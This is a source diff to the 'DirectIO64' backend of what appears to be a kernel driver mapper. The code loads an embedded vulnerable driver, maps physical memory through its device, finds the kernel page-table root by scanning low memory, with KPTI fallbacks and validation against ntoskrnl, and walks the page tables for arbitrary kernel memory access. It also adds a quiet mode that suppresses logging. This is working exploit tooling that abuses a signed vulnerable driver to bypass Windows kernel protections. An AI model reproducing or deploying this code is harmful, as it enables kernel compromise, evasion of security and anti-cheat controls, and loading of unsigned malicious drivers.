@@ -3,27 +3,36 @@
 #if defined(KZEROMAPPER_ENABLE_DIRECTIO64)
 
 #include "DirectIO64Backend.h"
-#include "../Common/VulnerableDriverLoader.h"
+#include "../Common/vDriverLoader.h"
 #include "directio64_sys.h"
 #include "halamd64.h"
 #include <algorithm>
+#include <vector>
 
 std::string DirectIO64Backend::Name( ) const
 {
 	return pstra( "DirectIO64" );
 }
 
+NTSTATUS DirectIO64Backend::Load( )
+{
+	m_CallGate = KernelCallGate::NtQueryAtom;
+
+	return KernelRwCallBackend::Load( );
+}
+
 NTSTATUS DirectIO64Backend::LoadDevice( )
 {
 	auto image = Tools::DecodePEBuffer( directio64_sys, sizeof( directio64_sys ) );
 
-	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\DIRECTIOLPT" ), image.data( ), image.size( ), &m_Device, 0x9160 );
+	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\DIRECTIOLPT" ),
+		image.data( ), image.size( ), &m_Device, 0x9160, pstra( "DIRECTIOLPT" ) );
 }
 
 NTSTATUS DirectIO64Backend::UnloadDevice( )
 {
 	CloseMapperDevice( &m_Device );
-	return UnloadMapperDriver( );
+	return UnloadMapperDriver( pstra( "DIRECTIOLPT" ) );
 }
 
 bool DirectIO64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
@@ -101,11 +110,17 @@ bool DirectIO64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffe
 	PVOID allocatedMdl = nullptr;
 	HANDLE sectionHandle = nullptr;
 
+	constexpr uint64_t maxValidPa = 0x10000000000ull;
+
+	if ( physicalAddress >= maxValidPa )
+		return false;
+
 	auto mappedSection = MapPhysicalMemory( physicalAddress, bytes, &sectionHandle, &allocatedMdl, write ? TRUE : FALSE );
 
 	if ( !mappedSection )
 	{
-		LOG_SEC( "[-] - [DirectIO64] ReadWritePhysical map failed pa=0x%llx size=0x%X write=%d gle=%lu", physicalAddress, bytes, write ? 1 : 0, GetLastError( ) );
+		if ( !m_QuietMode )
+			LOG_SEC( "[-] - [DirectIO64] ReadWritePhysical map failed pa=0x%llx size=0x%X write=%d gle=%lu", physicalAddress, bytes, write ? 1 : 0, GetLastError( ) );
 		return false;
 	}
 
@@ -132,62 +147,241 @@ bool DirectIO64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffe
 	return result;
 }
 
+namespace
+{
+	ULONG GetProcessorStartBlockCr3Offset( )
+	{
+		return FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
+			FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
+	}
+
+	ULONG ScanLowStubForPml4( const uint8_t* data, ULONG size )
+	{
+		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
+		const auto lmTargetOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget );
+		constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
+		constexpr uint64_t maxPhysAddr = 0x10000000000ull;
+
+		for ( ULONG i = 0; i < size; i += 0x1000 )
+		{
+			__try
+			{
+				const auto ptr = r_cast<uintptr_t>( data + i );
+
+				if ( ptr + cr3Offset + 8 > r_cast<uintptr_t>( data ) + size )
+					break;
+
+				const auto cr3 = *r_cast<const uint64_t*>( ptr + cr3Offset );
+
+				if ( cr3 == 0 || cr3 == 0xFFFFFFFFFFFFFFFFull )
+					continue;
+
+				if ( ( cr3 >> 52 ) != 0 )
+					continue;
+
+				const auto cr3Page = cr3 & PhysicalAddressMask;
+				if ( !cr3Page || cr3Page >= maxPhysAddr )
+					continue;
+
+				if ( lmTargetOffset + 8 > 0x1000 )
+					continue;
+
+				const auto lmTarget = *r_cast<const uint64_t*>( ptr + lmTargetOffset );
+
+				if ( ( lmTarget & 0xfffff80000000000ull ) != 0xfffff80000000000ull )
+					continue;
+
+				return i;
+			}
+			__except ( EXCEPTION_EXECUTE_HANDLER )
+			{
+				continue;
+			}
+		}
+
+		return 0xFFFFFFFF;
+	}
+
+	struct QuietGuardDirectIO
+	{
+		bool& m_Flag;
+		explicit QuietGuardDirectIO( bool& flag ) : m_Flag( flag ) { m_Flag = true; }
+		~QuietGuardDirectIO( ) { m_Flag = false; }
+	};
+
+	bool SafeMemcpyDirectIO( void* dst, const void* src, size_t size )
+	{
+		__try
+		{
+			memcpy( dst, src, size );
+			return true;
+		}
+		__except ( EXCEPTION_EXECUTE_HANDLER )
+		{
+			return false;
+		}
+	}
+}
+
+bool DirectIO64Backend::ValidateCr3WithNtoskrnl( uint64_t cr3 )
+{
+	if ( !m_Ntoskrnl )
+		return false;
+
+	uint64_t testPa = 0;
+	if ( !VirtualToPhysicalWithCr3( cr3, m_Ntoskrnl, &testPa ) )
+		return false;
+
+	if ( testPa == 0 || testPa >= 0x10000000000ull )
+		return false;
+
+	uint16_t mz = 0;
+	if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
+		return false;
+
+	return mz == 0x5A4D;
+}
+
 bool DirectIO64Backend::QueryPml4( uint64_t* value )
 {
 	if ( !value )
 		return false;
 
+	if ( m_Pml4Cache )
+	{
+		*value = m_Pml4Cache;
+		return true;
+	}
+
 	*value = 0;
 
-	PVOID allocatedMdl = nullptr;
-	HANDLE sectionHandle = nullptr;
+	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
+	const auto cr3Offset = FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
+		FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
+	const auto lmTargetOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget );
 
-	auto lowStub = r_cast<uintptr_t>( MapPhysicalMemory( 0, 0x100000, &sectionHandle, &allocatedMdl, FALSE ) );
+	constexpr ULONG mapSize = 0x1000000;
+	constexpr ULONG chunkSize = 0x100000;
+	std::vector<uint8_t> lowMemory( mapSize );
 
-	if ( !lowStub )
+	bool readOk = true;
+
+	for ( ULONG chunkOffset = 0; chunkOffset < mapSize && readOk; chunkOffset += chunkSize )
 	{
-		LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to map low stub gle=%lu", GetLastError( ) );
+		PVOID allocatedMdl = nullptr;
+		HANDLE sectionHandle = nullptr;
+
+		auto mapped = MapPhysicalMemory( chunkOffset, chunkSize, &sectionHandle, &allocatedMdl, FALSE );
+
+		if ( !mapped )
+		{
+			LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to map low chunk pa=0x%llx gle=%lu", chunkOffset, GetLastError( ) );
+			readOk = false;
+			break;
+		}
+
+		if ( !SafeMemcpyDirectIO( lowMemory.data( ) + chunkOffset, mapped, chunkSize ) )
+		{
+			LOG_SEC( "[-] - [DirectIO64] QueryPml4 exception reading chunk pa=0x%llx", chunkOffset );
+			readOk = false;
+		}
+
+		UnmapPhysicalMemory( mapped, sectionHandle, allocatedMdl );
+	}
+
+	if ( !readOk )
+		return false;
+
+	const auto stubOffset = ScanLowStubForPml4( lowMemory.data( ), mapSize );
+
+	if ( stubOffset != 0xFFFFFFFF )
+	{
+		const auto rawCr3 = *r_cast<const uint64_t*>( lowMemory.data( ) + stubOffset + cr3Offset );
+
+		if ( ValidateCr3WithNtoskrnl( rawCr3 ) )
+		{
+			m_Pml4Cache = rawCr3;
+			*value = rawCr3;
+			LOG_SEC( "[*] - [DirectIO64] QueryPml4 validated pml4=0x%llx", *value );
+			return true;
+		}
+
+		const auto cr3Pa = rawCr3 & PhysicalAddressMask;
+		const auto pcid = rawCr3 & 0xFFFull;
+
+		const uint64_t kptiCandidates[ 5 ] = {
+			( cr3Pa + 0x1000 ) | pcid,
+			( cr3Pa + 0x1000 ),
+			( cr3Pa - 0x1000 ) | pcid,
+			( cr3Pa - 0x1000 ),
+			( cr3Pa + 0x1000 ) | ( pcid ^ 0x1000 ),
+		};
+
+		for ( int i = 0; i < 5; ++i )
+		{
+			if ( kptiCandidates[ i ] == rawCr3 )
+				continue;
+
+			if ( ValidateCr3WithNtoskrnl( kptiCandidates[ i ] ) )
+			{
+				m_Pml4Cache = kptiCandidates[ i ];
+				*value = kptiCandidates[ i ];
+				LOG_SEC( "[*] - [DirectIO64] QueryPml4 KPTI kernel cr3=0x%llx (variant %d, user=0x%llx)",
+					*value, i, rawCr3 );
+				return true;
+			}
+		}
+
+		LOG_SEC( "[-] - [DirectIO64] Low stub CR3 and KPTI variants all failed validation", 0 );
+	}
+
+	LOG_SEC( "[*] - [DirectIO64] Scanning low 16MB for CR3 candidates", 0 );
+
+	if ( !m_Ntoskrnl )
+	{
+		LOG_SEC( "[-] - [DirectIO64] No validation VA (ntoskrnl=0)", 0 );
 		return false;
 	}
 
-	const auto cr3Offset = FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
-		FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
+	const auto p = r_cast<const uint64_t*>( lowMemory.data( ) );
+	const size_t qwordCount = mapSize / sizeof( uint64_t );
 
-	ULONG offset = 0;
-
-	while ( offset < 0x100000 )
+	ULONG tested = 0;
 	{
-		offset += 0x1000;
+		QuietGuardDirectIO guard( m_QuietMode );
 
-		__try
+		for ( size_t i = 0; i < qwordCount; ++i )
 		{
-			if ( 0x00000001000600E9 != ( 0xffffffffffff00ff & *r_cast<uint64_t*>( lowStub + offset ) ) )
+			const auto candidate = p[ i ];
+
+			if ( candidate == 0 || candidate == 0xFFFFFFFFFFFFFFFFull )
 				continue;
 
-			if ( 0xfffff80000000000 != ( 0xfffff80000000003 & *r_cast<uint64_t*>( lowStub + offset + FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget ) ) ) )
+			if ( ( candidate >> 52 ) != 0 )
 				continue;
 
-			if ( 0xffffff0000000fff & *r_cast<uint64_t*>( lowStub + offset + cr3Offset ) )
+			const auto candidatePa = candidate & PhysicalAddressMask;
+			if ( !candidatePa || candidatePa >= 0x10000000000ull )
 				continue;
 
-			*value = *r_cast<uint64_t*>( lowStub + offset + cr3Offset );
-			LOG_SEC( "[*] - [DirectIO64] QueryPml4 found pml4=0x%llx lowStubOffset=0x%X", *value, offset );
-			break;
-		}
-		__except ( EXCEPTION_EXECUTE_HANDLER )
-		{
-			LOG_SEC( "[-] - [DirectIO64] QueryPml4 exception offset=0x%X code=0x%X", offset, GetExceptionCode( ) );
-			*value = 0;
-			break;
+			if ( candidatePa < 0x1000 )
+				continue;
+
+			if ( !ValidateCr3WithNtoskrnl( candidate ) )
+				continue;
+
+			++tested;
+
+			m_Pml4Cache = candidate;
+			*value = candidate;
+			LOG_SEC( "[*] - [DirectIO64] QueryPml4 found pml4=0x%llx at offset=0x%llx (tested=%lu)",
+				*value, i * 8, tested );
+			return true;
 		}
 	}
 
-	UnmapPhysicalMemory( r_cast<PVOID>( lowStub ), sectionHandle, allocatedMdl );
-
-	if ( !*value )
-		LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to find PML4" );
-
-	return *value != 0;
+	LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to find PML4 (tested=%lu candidates)", tested );
+	return false;
 }
 
 bool DirectIO64Backend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
@@ -204,23 +398,22 @@ bool DirectIO64Backend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* ph
 	return false;
 }
 
-bool DirectIO64Backend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* physicalAddress )
+bool DirectIO64Backend::VirtualToPhysicalWithCr3( uint64_t cr3, uint64_t virtualAddress, uint64_t* physicalAddress )
 {
+	if ( !physicalAddress )
+		return false;
+
+	*physicalAddress = 0;
+
 	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
 	constexpr uint64_t PhysicalAddressMask2MbPages = 0x000fffffffe00000ull;
+	constexpr uint64_t PhysicalAddressMask1GbPages = 0x000fffffc0000000ull;
 	constexpr uint64_t VirtualAddressMask2MbPages = 0x00000000001fffffull;
+	constexpr uint64_t VirtualAddressMask1GbPages = 0x000000003fffffffull;
 	constexpr uint64_t VirtualAddressMask4KbPages = 0x0000000000000fffull;
 	constexpr uint64_t EntryPageSizeBit = 0x0000000000000080ull;
 
-	uint64_t pml4 = 0;
-
-	if ( !QueryPml4( &pml4 ) )
-	{
-		LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed QueryPml4 va=0x%llx", virtualAddress );
-		return false;
-	}
-
-	auto table = pml4 & PhysicalAddressMask;
+	auto table = cr3 & PhysicalAddressMask;
 	uint64_t entry = 0;
 
 	for ( int r = 0; r < 4; r++ )
@@ -229,15 +422,17 @@ bool DirectIO64Backend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* ph
 		const auto selector = ( virtualAddress >> shift ) & 0x1ff;
 
 		if ( !ReadWritePhysical( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ), false ) )
-		{
-			LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed read entry va=0x%llx level=%d table=0x%llx selector=0x%llx", virtualAddress, r, table, selector );
 			return false;
-		}
 
 		if ( !PageEntryToPhysicalAddress( entry, &table ) )
-		{
-			LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical entry not present va=0x%llx level=%d entry=0x%llx", virtualAddress, r, entry );
 			return false;
+
+		if ( r == 1 && ( entry & EntryPageSizeBit ) )
+		{
+			table &= PhysicalAddressMask1GbPages;
+			table += virtualAddress & VirtualAddressMask1GbPages;
+			*physicalAddress = table;
+			return true;
 		}
 
 		if ( r == 2 && ( entry & EntryPageSizeBit ) )
@@ -245,15 +440,30 @@ bool DirectIO64Backend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* ph
 			table &= PhysicalAddressMask2MbPages;
 			table += virtualAddress & VirtualAddressMask2MbPages;
 			*physicalAddress = table;
-			LOG_SEC( "[*] - [DirectIO64] VirtualToPhysical large-page va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );
 			return true;
 		}
 	}
 
 	table += virtualAddress & VirtualAddressMask4KbPages;
 	*physicalAddress = table;
+	return true;
+}
 
-	LOG_SEC( "[*] - [DirectIO64] VirtualToPhysical va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );
+bool DirectIO64Backend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* physicalAddress )
+{
+	uint64_t pml4 = 0;
+
+	if ( !QueryPml4( &pml4 ) )
+	{
+		LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed QueryPml4 va=0x%llx", virtualAddress );
+		return false;
+	}
+
+	if ( !VirtualToPhysicalWithCr3( pml4, virtualAddress, physicalAddress ) )
+	{
+		LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed table walk va=0x%llx pml4=0x%llx", virtualAddress, pml4 );
+		return false;
+	}
 
 	return true;
 }
